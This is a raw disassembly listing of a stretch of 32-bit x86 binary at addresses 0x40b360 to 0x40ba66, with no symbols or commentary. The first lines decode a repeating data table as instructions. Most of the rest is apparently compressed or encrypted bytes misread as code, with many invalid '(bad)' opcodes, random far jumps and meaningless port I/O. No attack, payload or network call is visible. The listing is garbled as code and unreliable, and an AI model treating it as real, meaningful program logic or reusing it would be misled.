  40b360:	inc    eax
  40b361:	mov    esp,0xc03cc0c0
  40b366:	(bad)  
  40b367:	les    edi,FWORD PTR [eax]
  40b369:	(bad)  
  40b36a:	enter  0x34c8,0xc8
  40b36e:	int3   
  40b36f:	int3   
  40b370:	xor    ah,cl
  40b372:	rcl    al,1
  40b374:	sub    al,0xd0
  40b376:	aam    0xd4
  40b378:	sub    ah,dl
  40b37a:	fcomp  st(0)
  40b37c:	and    al,0xd8
  40b37e:	(bad)  
  40b380:	and    ah,bl
  40b382:	loopne 0x40b364
  40b384:	sbb    al,0xe0
  40b386:	in     al,0xe4
  40b388:	sbb    ah,ah
  40b38a:	call   0xed28c877
  40b38f:	in     al,dx
  40b390:	adc    ah,ch
  40b392:	lock lock or al,0xf0
  40b396:	hlt    
  40b397:	hlt    
  40b398:	or     ah,dh
  40b39a:	clc    
  40b39b:	clc    
  40b39c:	add    al,0xf8
  40b39e:	cld    
  40b39f:	cld    
  40b3a0:	add    ah,bh
  40b3a2:	add    BYTE PTR [eax],al
  40b3a4:	cld    
  40b3a5:	add    BYTE PTR [esp+eax*1],al
  40b3a8:	clc    
  40b3a9:	add    al,0x8
  40b3ab:	or     ah,dh
  40b3ad:	or     BYTE PTR [esp+ecx*1],cl
  40b3b0:	lock or al,0x10
  40b3b3:	adc    ah,ch
  40b3b5:	adc    BYTE PTR [esp+edx*1],dl
  40b3b8:	call   0xe458cbd1
  40b3bd:	sbb    BYTE PTR [esp+ebx*1],bl
  40b3c0:	loopne 0x40b3de
  40b3c2:	and    BYTE PTR [eax],ah
  40b3c4:	fsub   QWORD PTR [eax]
  40b3c6:	and    al,0x24
  40b3c8:	fsub   DWORD PTR [eax+ebp*1]
  40b3cb:	sub    ah,dl
  40b3cd:	sub    BYTE PTR [esp+ebp*1],ch
  40b3d0:	shr    BYTE PTR [eax+esi*1],1
  40b3d3:	xor    ah,cl
  40b3d5:	xor    BYTE PTR [esp+esi*1],dh
  40b3d8:	enter  0x3834,0x38
  40b3dc:	les    edi,FWORD PTR [eax]
  40b3de:	cmp    al,0x3c
  40b3e0:	sar    BYTE PTR [eax+eax*2],0x40
  40b3e4:	mov    esp,0xb8444440
  40b3e9:	inc    esp
  40b3ea:	dec    eax
  40b3eb:	dec    eax
  40b3ec:	mov    ah,0x48
  40b3ee:	dec    esp
  40b3ef:	dec    esp
  40b3f0:	mov    al,0x4c
  40b3f2:	push   eax
  40b3f3:	push   eax
  40b3f4:	lods   al,BYTE PTR ds:[esi]
  40b3f5:	push   eax
  40b3f6:	push   esp
  40b3f7:	push   esp
  40b3f8:	test   al,0x54
  40b3fa:	pop    eax
  40b3fb:	pop    eax
  40b3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fd:	pop    eax
  40b3fe:	pop    esp
  40b3ff:	pop    esp
  40b400:	mov    al,ds:0x9c60605c
  40b405:	pusha  
  40b406:	fs fs cwde 
  40b409:	fs push 0x6c689468
  40b40f:	ins    BYTE PTR es:[edi],dx
  40b410:	nop
  40b411:	ins    BYTE PTR es:[edi],dx
  40b412:	jo     0x40b484
  40b414:	mov    WORD PTR [eax+0x74],?
  40b417:	je     0x40b3a1
  40b419:	je     0x40b493
  40b41b:	js     0x40b3a1
  40b41d:	js     0x40b49b
  40b41f:	jl     0x40b3a1
  40b421:	jl     0x40b3a3
  40b423:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40b428:	js     0x40b3ae
  40b42a:	mov    BYTE PTR [eax-0x7373778c],cl
  40b430:	jo     0x40b3be
  40b432:	nop
  40b433:	nop
  40b434:	ins    BYTE PTR es:[edi],dx
  40b435:	nop
  40b436:	xchg   esp,eax
  40b437:	xchg   esp,eax
  40b438:	push   0x64989894
  40b43d:	cwde   
  40b43e:	pushf  
  40b43f:	pushf  
  40b440:	pusha  
  40b441:	pushf  
  40b442:	mov    al,ds:0xa4a05ca0
  40b447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b448:	pop    eax
  40b449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44a:	test   al,0xa8
  40b44c:	push   esp
  40b44d:	test   al,0xac
  40b44f:	lods   al,BYTE PTR ds:[esi]
  40b450:	push   eax
  40b451:	lods   al,BYTE PTR ds:[esi]
  40b452:	mov    al,0xb0
  40b454:	dec    esp
  40b455:	mov    al,0xb4
  40b457:	mov    ah,0x48
  40b459:	mov    ah,0xb8
  40b45b:	mov    eax,0xbcbcb844
  40b460:	inc    eax
  40b461:	mov    esp,0xc03cc0c0
  40b466:	(bad)  
  40b467:	les    edi,FWORD PTR [eax]
  40b469:	(bad)  
  40b46a:	enter  0x34c8,0xc8
  40b46e:	int3   
  40b46f:	int3   
  40b470:	xor    ah,cl
  40b472:	rcl    al,1
  40b474:	sub    al,0xd0
  40b476:	aam    0xd4
  40b478:	sub    ah,dl
  40b47a:	fcomp  st(0)
  40b47c:	and    al,0xd8
  40b47e:	(bad)  
  40b480:	and    ah,bl
  40b482:	loopne 0x40b464
  40b484:	sbb    al,0xe0
  40b486:	in     al,0xe4
  40b488:	sbb    ah,ah
  40b48a:	call   0xed28c977
  40b48f:	in     al,dx
  40b490:	adc    ah,ch
  40b492:	lock lock or al,0xf0
  40b496:	hlt    
  40b497:	hlt    
  40b498:	or     ah,dh
  40b49a:	clc    
  40b49b:	clc    
  40b49c:	add    al,0xf8
  40b49e:	cld    
  40b49f:	cld    
  40b4a0:	add    ah,bh
  40b4a2:	and    DWORD PTR [edi+0x4060002],edx
  40b4a8:	clc    
  40b4a9:	add    BYTE PTR [eax],cl
  40b4ab:	or     ah,dh
  40b4ad:	js     0x40b520
  40b4af:	repz pause 
  40b4b2:	mov    ah,0x73
  40b4b4:	jbe    0x40b4c7
  40b4b6:	aaa    
  40b4b7:	lods   al,BYTE PTR ds:[esi]
  40b4b8:	push   0xe266fbe5
  40b4bd:	cdq    
  40b4be:	repnz neg bl
  40b4c1:	jmp    0x40b536
  40b4c3:	(bad)  
  40b4c4:	mov    DWORD PTR [ebx-0x41cbcb38],edi
  40b4ca:	adc    BYTE PTR [eax],0x12
  40b4cd:	out    dx,eax
  40b4ce:	jp     0x40b513
  40b4d0:	loop   0x40b454
  40b4d2:	ret    
  40b4d3:	loop   0x40b49b
  40b4d5:	dec    edx
  40b4d6:	arpl   WORD PTR [edi+0x666292d1],dx
  40b4dc:	push   cs
  40b4dd:	out    0x38,al
  40b4df:	out    dx,al
  40b4e0:	or     DWORD PTR [ebx+0x29],edx
  40b4e3:	rcr    eax,cl
  40b4e5:	int3   
  40b4e6:	into   
  40b4e7:	dec    eax
  40b4e8:	shl    BYTE PTR [esi],1
  40b4ea:	and    eax,0x41dd9cd0
  40b4ef:	repz shl esp,0x34
  40b4f3:	loop   0x40b500
  40b4f5:	pop    esi
  40b4f6:	push   ebp
  40b4f7:	and    ecx,DWORD PTR [ecx]
  40b4f9:	adc    eax,0x963a11bc
  40b4fe:	pusha  
  40b4ff:	lock mov ebp,0xab2280a6
  40b505:	push   ds
  40b506:	adc    ecx,DWORD PTR [esi+0x49b7f065]
  40b50c:	imul   edi,esi,0xa71990b6
  40b512:	in     eax,0xc5
  40b514:	lods   eax,DWORD PTR ds:[esi]
  40b515:	adc    eax,0x6a69b75a
  40b51a:	sub    bh,BYTE PTR [ebx]
  40b51c:	out    0x34,al
  40b51e:	aad    0xcd
  40b520:	sbb    al,0xf5
  40b522:	ins    BYTE PTR es:[edi],dx
  40b523:	inc    edx
  40b524:	fs jne 0x40b531
  40b527:	pop    eax
  40b528:	inc    ecx
  40b529:	scas   al,BYTE PTR es:[edi]
  40b52a:	fild   QWORD PTR [ebx]
  40b52c:	push   ecx
  40b52d:	mov    eax,0x83aa30eb
  40b532:	mov    BYTE PTR [ebx-0x20bb107d],dh
  40b538:	aam    0x93
  40b53a:	pusha  
  40b53b:	jns    0x40b500
  40b53d:	int    0x81
  40b53f:	jmp    0x40b54b
  40b541:	and    dh,dh
  40b543:	sub    al,0x7b
  40b545:	dec    edx
  40b546:	and    ebx,DWORD PTR [edx]
  40b548:	pop    ebx
  40b549:	mov    BYTE PTR [edx-0x1c0f839b],ah
  40b54f:	aaa    
  40b550:	in     al,dx
  40b551:	xchg   esi,ebx
  40b553:	and    al,0xff
  40b555:	jnp    0x40b52f
  40b557:	ffreep st(3)
  40b559:	or     DWORD PTR [eax],esp
  40b55b:	dec    edx
  40b55c:	data16 mov ah,0x5e
  40b55f:	inc    esp
  40b560:	mov    cl,0xaa
  40b562:	and    DWORD PTR [edi-0x2b201985],edi
  40b568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b569:	js     0x40b517
  40b56b:	sub    DWORD PTR [esi],ecx
  40b56d:	imul   ebx,DWORD PTR [ecx-0x6c],0x28
  40b571:	hlt    
  40b572:	lods   eax,DWORD PTR ds:[esi]
  40b573:	adc    ebp,DWORD PTR [edi]
  40b575:	or     ebx,DWORD PTR [edx-0x45]
  40b578:	in     eax,dx
  40b579:	sub    al,0x9c
  40b57b:	lods   eax,DWORD PTR ds:[esi]
  40b57c:	mov    eax,0x45020cbe
  40b581:	dec    esp
  40b582:	jmp    0xf699260f
  40b587:	stos   BYTE PTR es:[edi],al
  40b588:	mov    ecx,0xff04ac6a
  40b58d:	ret    
  40b58e:	xchg   edi,eax
  40b58f:	fcos   
  40b591:	adc    al,0xd
  40b593:	faddp  st(2),st
  40b595:	(bad)  
  40b596:	and    cl,BYTE PTR [esi-0x53]
  40b599:	dec    edx
  40b59a:	add    edx,DWORD PTR [edx]
  40b59c:	dec    ebp
  40b59d:	mov    ebx,0x99416976
  40b5a2:	or     dl,ah
  40b5a4:	in     al,0xd8
  40b5a6:	add    bl,BYTE PTR [ecx-0x9a3c45e]
  40b5ac:	aas    
  40b5ad:	dec    edx
  40b5ae:	cdq    
  40b5af:	dec    ebx
  40b5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5b1:	push   edi
  40b5b2:	cli    
  40b5b3:	mov    dl,0xf7
  40b5b5:	jle    0x40b635
  40b5b7:	imul   edi,DWORD PTR ss:[ebx+0x1f],0xffffffa7
  40b5bc:	cld    
  40b5bd:	fs in  eax,dx
  40b5bf:	mov    ebp,0x13ff1aa7
  40b5c4:	data16 arpl WORD PTR [eax-0x61],bp
  40b5c8:	inc    DWORD PTR [esi]
  40b5ca:	mov    eax,ds:0x29e9ca86
  40b5cf:	xchg   DWORD PTR [eax-0x40760a2c],esi
  40b5d5:	or     al,0xcf
  40b5d7:	sbb    BYTE PTR [ebx+0x3],bl
  40b5da:	pushf  
  40b5db:	cmc    
  40b5dc:	jge    0x40b5cd
  40b5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5df:	(bad)  
  40b5e0:	fs inc ebx
  40b5e2:	pushf  
  40b5e3:	inc    esi
  40b5e4:	lock or BYTE PTR [ecx],0xb
  40b5e8:	addr16 repnz mov al,0xf2
  40b5ec:	popa   
  40b5ed:	fnsave [ecx]
  40b5ef:	aam    0xa8
  40b5f1:	jp     0x40b5a9
  40b5f3:	jge    0x40b64d
  40b5f5:	stc    
  40b5f6:	neg    BYTE PTR ds:0xf15f92f3
  40b5fc:	out    dx,al
  40b5fd:	pop    edx
  40b5fe:	sub    BYTE PTR [edx],0x60
  40b601:	imul   ebp,DWORD PTR [ebx+0x752f5363],0x67
  40b608:	rcr    BYTE PTR [ebx],0x9b
  40b60b:	push   edi
  40b60c:	(bad)  
  40b60d:	ret    
  40b60e:	loopne 0x40b64e
  40b610:	cmp    eax,eax
  40b612:	mov    bl,ch
  40b614:	test   cl,ah
  40b616:	outs   dx,DWORD PTR ds:[esi]
  40b617:	clc    
  40b618:	not    BYTE PTR [edx]
  40b61a:	or     bh,dh
  40b61c:	mov    eax,ds:0x17f375d1
  40b621:	daa    
  40b622:	pop    eax
  40b623:	sub    ch,BYTE PTR [ebp+0x2827b235]
  40b629:	push   ds
  40b62a:	add    DWORD PTR [edx-0x25d9e6cf],ebp
  40b630:	dec    esi
  40b631:	out    0xb8,eax
  40b633:	mov    ecx,0x6b4a60b3
  40b638:	xchg   edi,eax
  40b639:	push   0xffffffa4
  40b63b:	sbb    BYTE PTR [esi+0x6cbf2053],0x43
  40b642:	fstp   QWORD PTR ds:0x1c2c1824
  40b648:	pop    ds
  40b649:	inc    ebx
  40b64a:	in     al,dx
  40b64b:	aam    0xbc
  40b64d:	mov    eax,ds:0xa0b29588
  40b652:	js     0x40b614
  40b654:	xor    dl,ch
  40b656:	push   ecx
  40b657:	mov    ebx,ebp
  40b659:	xchg   esp,eax
  40b65a:	jecxz  0x40b68d
  40b65c:	jp     0x40b61e
  40b65e:	ret    
  40b65f:	push   ds
  40b660:	or     al,0xd3
  40b662:	test   DWORD PTR [esi],edx
  40b664:	clc    
  40b665:	mov    ch,0xd1
  40b667:	dec    edi
  40b668:	retf   0xfe9f
  40b66b:	stos   BYTE PTR es:[edi],al
  40b66c:	push   es
  40b66d:	shl    DWORD PTR [edx-0xc7fb524],0x81
  40b674:	fisttp QWORD PTR [edi+0x206b0298]
  40b67a:	fistp  DWORD PTR [edx+0xa]
  40b67d:	push   ds
  40b67e:	cdq    
  40b67f:	(bad)  [edi]
  40b681:	ins    BYTE PTR es:[edi],dx
  40b682:	sub    esi,0x2c555f54
  40b688:	pop    es
  40b689:	jne    0x40b65b
  40b68b:	daa    
  40b68c:	int3   
  40b68d:	aam    0x2a
  40b68f:	ins    DWORD PTR es:[edi],dx
  40b690:	scas   eax,DWORD PTR es:[edi]
  40b691:	iret   
  40b692:	cdq    
  40b693:	push   esp
  40b694:	icebp  
  40b695:	ror    DWORD PTR [esi+0x606b5693],0x9
  40b69c:	inc    edi
  40b69d:	in     eax,0x73
  40b69f:	inc    eax
  40b6a0:	mov    WORD PTR [esp+ebx*8-0x29],?
  40b6a4:	sub    ebx,DWORD PTR [eax]
  40b6a6:	push   ebp
  40b6a7:	jno    0x40b653
  40b6a9:	or     ebx,ecx
  40b6ab:	xor    BYTE PTR [edx],0x11
  40b6ae:	out    0xa1,al
  40b6b0:	(bad)  
  40b6b2:	leave  
  40b6b3:	jecxz  0x40b691
  40b6b5:	sub    ebp,DWORD PTR [eax-0x5be0f818]
  40b6bb:	xchg   ebp,eax
  40b6bc:	test   DWORD PTR [ecx-0x4a],ecx
  40b6bf:	cdq    
  40b6c0:	mov    ds:0xf904e72a,al
  40b6c5:	jg     0x40b68b
  40b6c7:	mov    al,ds:0x7158ccc7
  40b6cc:	mov    eax,ds:0x4d967f7b
  40b6d1:	rol    BYTE PTR [edi],0xa2
  40b6d4:	lods   eax,DWORD PTR ds:[esi]
  40b6d5:	(bad)  
  40b6d7:	inc    ebp
  40b6d8:	mov    eax,ds:0x53e27373
  40b6dd:	jmp    0x40b676
  40b6df:	mov    dh,0x3a
  40b6e1:	mov    edi,0xceacf01d
  40b6e6:	sar    ecx,0x71
  40b6e9:	cwde   
  40b6ea:	test   DWORD PTR ds:0x8dc6bb50,esi
  40b6f0:	xchg   edi,eax
  40b6f1:	and    al,cl
  40b6f3:	mov    ch,0x60
  40b6f5:	mov    ch,0xb2
  40b6f7:	sub    DWORD PTR [eax],ecx
  40b6f9:	jge    0x40b6f4
  40b6fb:	push   ds
  40b6fc:	push   ds
  40b6fd:	(bad)  
  40b6ff:	cmp    eax,DWORD PTR [ebp-0x1d]
  40b702:	and    esi,ebp
  40b704:	mov    ds:0x57cfdc0b,eax
  40b709:	mov    ebx,0xaf4d9f7c
  40b70e:	(bad)  
  40b710:	dec    ecx
  40b711:	cmp    BYTE PTR [ecx-0x2e],cl
  40b714:	stos   BYTE PTR es:[edi],al
  40b715:	mov    ebx,DWORD PTR [esi+0x23]
  40b718:	fld    DWORD PTR ds:0x9caa27fa
  40b71e:	dec    esi
  40b71f:	push   cs
  40b720:	sub    eax,0x3358f486
  40b725:	ins    BYTE PTR es:[edi],dx
  40b726:	call   0x6a1a:0xb150b623
  40b72d:	mov    cx,0xb88f
  40b731:	mov    eax,0x8dc9c47b
  40b736:	xlat   BYTE PTR ds:[ebx]
  40b737:	dec    ebp
  40b738:	push   es
  40b739:	aas    
  40b73a:	sahf   
  40b73b:	xchg   ebx,eax
  40b73c:	loopne 0x40b796
  40b73e:	stos   DWORD PTR es:[edi],eax
  40b73f:	adc    eax,0x87e04d97
  40b744:	sbb    al,0x39
  40b746:	xchg   ebx,eax
  40b747:	mov    eax,0x962977db
  40b74c:	(bad)  
  40b74d:	lea    edx,[eax-0x1e4e6101]
  40b753:	mov    al,ds:0x30fb1bc7
  40b758:	test   dh,cl
  40b75a:	jb     0x40b734
  40b75c:	xor    BYTE PTR [esi-0x32],cl
  40b75f:	out    dx,al
  40b760:	pop    ds
  40b761:	xor    DWORD PTR [ecx+0x4],ebp
  40b764:	leave  
  40b765:	inc    ebp
  40b766:	jno    0x40b75a
  40b768:	hlt    
  40b769:	iret   
  40b76a:	push   eax
  40b76b:	add    eax,0x9070bd5b
  40b770:	dec    edx
  40b771:	(bad)  
  40b772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b773:	pop    ebp
  40b774:	imul   DWORD PTR [edi]
  40b776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b777:	jae    0x40b773
  40b779:	adc    DWORD PTR [esp+ebx*1+0xa3c8142],ebx
  40b780:	push   ecx
  40b781:	cmp    ch,BYTE PTR [ecx+edi*1-0x49]
  40b785:	lock and al,0x57
  40b788:	sti    
  40b789:	fucomip st,st(6)
  40b78b:	test   al,0x27
  40b78d:	call   DWORD PTR [edi+0xe]
  40b790:	jecxz  0x40b798
  40b792:	xor    eax,0x67fc7d66
  40b797:	arpl   WORD PTR [edi-0x26114fd3],ax
  40b79d:	outs   dx,BYTE PTR cs:[esi]
  40b79f:	sub    cl,BYTE PTR [esi+0x4631ffbd]
  40b7a5:	(bad)  
  40b7a6:	push   ss
  40b7a7:	cwde   
  40b7a8:	xchg   ebx,eax
  40b7a9:	or     al,BYTE PTR [ecx]
  40b7ab:	mov    ch,0x49
  40b7ad:	retf   
  40b7ae:	dec    esp
  40b7af:	dec    ebx
  40b7b0:	fadd   QWORD PTR [eax-0x22495918]
  40b7b6:	push   edi
  40b7b7:	in     al,0x3e
  40b7b9:	loope  0x40b750
  40b7bb:	and    eax,esi
  40b7bd:	leave  
  40b7be:	mov    bh,0x75
  40b7c0:	cmp    bh,cl
  40b7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c3:	push   esp
  40b7c4:	imul   DWORD PTR [ecx]
  40b7c6:	add    BYTE PTR [edx+0x55],al
  40b7c9:	leave  
  40b7ca:	inc    edi
  40b7cb:	mov    ds:0xe5eeb6cb,al
  40b7d0:	repz xor eax,0xb8fbf70e
  40b7d6:	shl    BYTE PTR [eax+0x20],0x7f
  40b7da:	xor    eax,0x3ef26655
  40b7df:	jl     0x40b799
  40b7e1:	imul   edi,esi,0xf
  40b7e4:	jnp    0x40b81a
  40b7e6:	adc    ebx,esi
  40b7e8:	dec    edi
  40b7e9:	int    0x68
  40b7eb:	scas   al,BYTE PTR es:[edi]
  40b7ec:	aam    0x8d
  40b7ee:	inc    ebx
  40b7ef:	cmp    al,0x9
  40b7f1:	ja     0x40b791
  40b7f3:	imul   edx,edi,0x38
  40b7f6:	sbb    cl,ch
  40b7f8:	iret   
  40b7f9:	dec    ebx
  40b7fa:	test   BYTE PTR [edx],bl
  40b7fc:	or     eax,0x4b205a1c
  40b801:	cmp    BYTE PTR [edi],dl
  40b803:	pusha  
  40b804:	shl    ecx,cl
  40b806:	adc    al,0xc2
  40b808:	dec    edi
  40b809:	jb     0x40b7a9
  40b80b:	push   esi
  40b80c:	push   ds
  40b80d:	scas   al,BYTE PTR es:[edi]
  40b80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b80f:	es (bad) 
  40b811:	sub    BYTE PTR [ebx],0x65
  40b814:	or     eax,0xa94e9e49
  40b819:	(bad)  
  40b81a:	out    dx,al
  40b81b:	xor    BYTE PTR [esi+0x4e],ch
  40b81e:	sbb    eax,0xdf008d1
  40b823:	aaa    
  40b824:	inc    ebp
  40b825:	adc    al,0x4d
  40b827:	inc    edx
  40b828:	pop    edx
  40b829:	or     eax,0x743f333f
  40b82e:	mul    DWORD PTR [ebx]
  40b830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b832:	xchg   esi,eax
  40b833:	lahf   
  40b834:	lods   al,BYTE PTR gs:[esi]
  40b836:	(bad)  
  40b837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b838:	sti    
  40b839:	jp     0x40b899
  40b83b:	and    ebp,0xfffffff8
  40b83e:	cmp    eax,0x6b8d2fe5
  40b843:	jmp    0x22e9:0xf3b69690
  40b84a:	cdq    
  40b84b:	lods   eax,DWORD PTR ds:[esi]
  40b84c:	push   0x18
  40b84e:	setns  ch
  40b851:	mov    cl,BYTE PTR [edx-0x31]
  40b854:	mov    eax,edi
  40b856:	stos   DWORD PTR es:[edi],eax
  40b857:	pop    eax
  40b858:	scas   eax,DWORD PTR es:[edi]
  40b859:	ficomp WORD PTR [edx-0x45b06b09]
  40b85f:	retf   0x1553
  40b862:	cmp    dl,dl
  40b864:	push   eax
  40b865:	int    0x73
  40b867:	repnz lahf 
  40b869:	popa   
  40b86a:	fnstcw WORD PTR [ecx+0x64]
  40b86d:	or     eax,0xc7c09cfc
  40b872:	push   ecx
  40b873:	call   0x6ef802c8
  40b878:	jno    0x40b8d0
  40b87a:	arpl   WORD PTR [ebx+0x6a3e753],si
  40b880:	jne    0x40b8ef
  40b882:	leave  
  40b883:	(bad)  
  40b884:	pusha  
  40b885:	mov    esi,0xc4959809
  40b88a:	dec    esi
  40b88b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b88c:	jo     0x40b81d
  40b88e:	mov    BYTE PTR [ebp-0x2f],bh
  40b891:	out    0xea,al
  40b893:	xor    ah,dh
  40b895:	fcomp  DWORD PTR [edx+0x75fd6e19]
  40b89b:	or     eax,0xdd04f9f7
  40b8a0:	sub    dl,BYTE PTR [ecx]
  40b8a2:	stos   BYTE PTR es:[edi],al
  40b8a3:	lods   eax,DWORD PTR ds:[esi]
  40b8a4:	retf   0x1970
  40b8a7:	out    dx,al
  40b8a8:	dec    ecx
  40b8a9:	in     al,0x88
  40b8ab:	jae    0x40b8b2
  40b8ad:	idiv   DWORD PTR [edx+0x382205f5]
  40b8b3:	jo     0x40b8c1
  40b8b5:	cmp    al,BYTE PTR [ebx+esi*4-0x7750d10a]
  40b8bc:	mov    bh,0xd2
  40b8be:	push   edx
  40b8bf:	ins    DWORD PTR es:[edi],dx
  40b8c0:	ins    DWORD PTR es:[edi],dx
  40b8c1:	push   ds
  40b8c2:	jmp    0xab253084
  40b8c7:	outs   dx,DWORD PTR ds:[esi]
  40b8c8:	outs   dx,BYTE PTR es:[esi]
  40b8ca:	rcr    bh,1
  40b8cc:	mov    cl,dl
  40b8ce:	jg     0x40b930
  40b8d0:	sub    BYTE PTR [ecx-0x75e366fa],cl
  40b8d6:	cdq    
  40b8d7:	shl    ebp,0x4
  40b8da:	stos   BYTE PTR es:[edi],al
  40b8db:	ins    BYTE PTR es:[edi],dx
  40b8dc:	sub    BYTE PTR [eax+0x63a473f8],0x61
  40b8e3:	sub    eax,0xcabf911b
  40b8e8:	data16 scas al,BYTE PTR es:[edi]
  40b8ea:	mov    al,ds:0x4ce66e03
  40b8ef:	mov    ch,0x90
  40b8f1:	push   ds
  40b8f2:	sbb    BYTE PTR [edx],bl
  40b8f4:	xor    eax,DWORD PTR [ebx]
  40b8f6:	xchg   ebp,eax
  40b8f7:	cld    
  40b8f8:	fidiv  WORD PTR [esi]
  40b8fa:	retf   
  40b8fb:	cld    
  40b8fc:	push   ebp
  40b8fd:	mov    ds,WORD PTR [ebp+0x5f510239]
  40b903:	dec    esi
  40b904:	dec    esi
  40b905:	and    DWORD PTR [ecx],0xd0ed6845
  40b90b:	shl    ecx,1
  40b90d:	nop
  40b90e:	mov    ?,ecx
  40b910:	int    0xa0
  40b912:	mov    edi,0xf69285bf
  40b917:	jo     0x40b98c
  40b919:	pop    ebp
  40b91a:	pop    esp
  40b91b:	jle    0x40b95a
  40b91d:	mov    ebp,fs
  40b91f:	mov    dl,0x8d
  40b921:	test   BYTE PTR [ebx],ch
  40b923:	cli    
  40b924:	clc    
  40b925:	enter  0x37,0x8a
  40b929:	adc    BYTE PTR [edi],dl
  40b92b:	outs   dx,DWORD PTR ds:[esi]
  40b92c:	out    0xde,al
  40b92e:	test   DWORD PTR [esi+0x20d8661e],eax
  40b934:	mov    ebp,0x65a0576f
  40b939:	scas   al,BYTE PTR es:[edi]
  40b93a:	test   DWORD PTR [ebp-0x39],ebp
  40b93d:	xchg   esp,eax
  40b93e:	inc    esi
  40b93f:	xchg   esi,eax
  40b940:	jecxz  0x40b8ec
  40b942:	dec    esi
  40b943:	mov    dh,0x9c
  40b945:	clc    
  40b946:	fcom   DWORD PTR [eax+0x43deaea8]
  40b94c:	fnstsw WORD PTR [ebp-0x4d376e52]
  40b952:	sbb    cl,cl
  40b954:	sbb    al,0xc
  40b956:	push   ds
  40b957:	cmc    
  40b958:	out    dx,eax
  40b959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95a:	sbb    dh,BYTE PTR [edx+0x2d]
  40b95d:	cs pop ecx
  40b95f:	loopne 0x40b900
  40b961:	int3   
  40b962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b963:	fisubr DWORD PTR ds:0x510961f3
  40b969:	pop    ds
  40b96a:	add    bl,ch
  40b96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96d:	xchg   ebx,eax
  40b96e:	call   0x462c:0xb0a016e0
  40b975:	add    eax,DWORD PTR fs:[edi+esi*4]
  40b979:	xchg   cl,dh
  40b97b:	arpl   sp,bx
  40b97d:	daa    
  40b97e:	fiadd  DWORD PTR [esi]
  40b980:	sub    BYTE PTR [edx-0x6c19821a],0xe9
  40b987:	lock aam 0x71
  40b98a:	or     al,0xe9
  40b98c:	lahf   
  40b98d:	and    cl,BYTE PTR ds:0xc30d4e5c
  40b993:	std    
  40b994:	jns    0x40b96c
  40b996:	mov    ebx,0x8d1a17be
  40b99b:	mov    esp,0x64840d8f
  40b9a0:	(bad)  
  40b9a1:	call   0x25899024
  40b9a6:	arpl   WORD PTR [esi+0x51b6e9f6],sp
  40b9ac:	imul   ebp,DWORD PTR [esi-0x6fe986d3],0xffffffad
  40b9b3:	add    eax,0xbcd27583
  40b9b8:	addr16 inc ebp
  40b9ba:	and    eax,0x7cbb4c17
  40b9bf:	jl     0x40b94e
  40b9c1:	into   
  40b9c2:	sub    DWORD PTR [ecx],edi
  40b9c4:	div    BYTE PTR [ebp+0xd]
  40b9c7:	mov    ah,BYTE PTR ss:[esi+0x5e]
  40b9cb:	nop
  40b9cc:	(bad)  
  40b9cd:	in     ax,0xa6
  40b9d0:	mov    dl,BYTE PTR [esi]
  40b9d2:	dec    ebp
  40b9d3:	stc    
  40b9d4:	outs   dx,DWORD PTR ds:[esi]
  40b9d5:	cli    
  40b9d6:	aaa    
  40b9d7:	jmp    0x5253:0x1799c06c
  40b9de:	sbb    BYTE PTR [esi-0x59],cl
  40b9e1:	lea    esi,[edi-0x6e41d1e7]
  40b9e7:	push   ds
  40b9e8:	sub    al,0x91
  40b9ea:	mov    eax,0x6c4f54a1
  40b9ef:	scas   eax,DWORD PTR es:[edi]
  40b9f0:	xor    bl,dl
  40b9f2:	xchg   esp,eax
  40b9f3:	mov    ecx,0x9fa1d45c
  40b9f8:	retf   0xb01f
  40b9fb:	in     al,dx
  40b9fc:	cmc    
  40b9fd:	shl    BYTE PTR [eax+0x42f371e9],1
  40ba03:	xchg   edi,eax
  40ba04:	xchg   esp,eax
  40ba05:	pop    ecx
  40ba06:	scas   al,BYTE PTR es:[edi]
  40ba07:	mov    WORD PTR [ebp+0x10],gs
  40ba0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0b:	inc    esi
  40ba0c:	xchg   esi,eax
  40ba0d:	(bad)  
  40ba0f:	jb     0x40b9d2
  40ba11:	(bad)  
  40ba12:	push   eax
  40ba13:	call   0x633e7346
  40ba18:	inc    ebx
  40ba19:	push   cs
  40ba1a:	cdq    
  40ba1b:	mov    al,0xa9
  40ba1d:	inc    ebx
  40ba1e:	fstp   QWORD PTR [eax-0x1d]
  40ba21:	jmp    0x86c1d84b
  40ba26:	mov    DWORD PTR [ebx+0x5a],ebx
  40ba29:	cdq    
  40ba2a:	das    
  40ba2b:	call   0x999f:0x27d4a75d
  40ba32:	sti    
  40ba33:	add    DWORD PTR [ecx+0x63124e99],esi
  40ba39:	sahf   
  40ba3a:	or     bh,BYTE PTR [eax+0x2e61d6da]
  40ba40:	lea    ebp,[esi-0x25]
  40ba43:	sti    
  40ba44:	push   0x41
  40ba46:	jnp    0x40ba88
  40ba48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba4a:	mul    DWORD PTR [ebx]
  40ba4c:	pop    esi
  40ba4d:	mov    dl,0x77
  40ba4f:	add    BYTE PTR [edx-0x66318ee8],dl
  40ba55:	inc    edi
  40ba56:	or     al,0xcf
  40ba58:	or     dh,al
  40ba5a:	cs loopne 0x40baa5
  40ba5d:	ret    
  40ba5e:	jns    0x40ba59
  40ba60:	sbb    eax,DWORD PTR [edi+0x40785095]
  40ba66:	gs test al,0x18
